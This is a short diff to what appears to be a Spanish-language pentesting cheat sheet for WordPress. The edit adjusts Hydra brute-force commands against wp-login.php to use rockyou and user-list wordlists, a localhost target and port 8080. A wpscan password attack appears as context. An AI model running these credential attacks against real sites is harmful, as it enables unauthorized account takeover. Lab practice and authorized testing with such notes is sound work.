@@ -111,14 +111,14 @@ wpscan --url <url/wp-login.php> --passwords <ruta_diccionario.txt> --usernames <
 Ataque de fuerza bruta con Hydra
 
 ```bash
-hydra -l <username> -P /usr/share/wordlists/rockyou.txt <url> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=incorrect"
+hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=incorrect"
 ```
 
 
 Ataque a múltiples usuarios:
 
 ```bash
-hydra -L <lista_usuarios.txt> -P <diccionario.txt> <url> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=incorrect"
+hydra -L <lista_usuarios.txt> -P <diccionario.txt> <url> -s 8080 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=incorrect"
 ```
 
 ---
